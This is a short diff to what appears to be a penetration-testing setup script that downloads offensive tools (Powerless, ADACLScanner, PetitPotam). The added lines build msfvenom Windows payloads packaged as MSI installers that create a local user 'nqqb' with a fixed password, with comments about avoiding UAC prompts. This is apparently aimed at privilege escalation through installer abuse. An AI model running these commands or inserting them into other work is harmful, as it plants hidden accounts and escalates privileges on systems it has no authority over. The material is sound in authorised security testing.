@@ -129,6 +129,9 @@ wget https://github.com/gladiatx0r/Powerless/raw/master/Powerless.bat
 wget https://github.com/canix1/ADACLScanner/releases/download/7.9/ADACLScan.ps1
 wget https://github.com/topotam/PetitPotam/raw/main/PetitPotam.exe
 
+msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
+msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
+
 rm -f *.zip *.gz
 
 cd ..
